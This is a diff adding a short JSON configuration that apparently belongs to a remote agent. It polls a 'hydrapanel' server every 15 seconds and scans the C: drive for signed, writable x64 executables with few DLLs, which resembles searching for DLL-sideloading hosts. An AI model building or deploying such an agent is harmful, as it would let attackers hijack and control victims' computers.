@@ -1,0 +1,20 @@
+{
+  "server_url": "https://login.hydrapanel.vip",
+  "bootstrap_token": "0x00000000000000000000000000000000",
+  "poll_seconds": 15,
+  "allowed_roots": [
+    "C:\\"
+  ],
+  "startup_scan": {
+    "enabled": true,
+    "path": "C:\\",
+    "image_type": "x64",
+    "sign": "signed",
+    "rate": "best",
+    "write_perm": true,
+    "best_dll_count": 2,
+    "best_exe_size": 10240,
+    "good_dll_count": 5,
+    "good_exe_size": 51200
+  }
+}
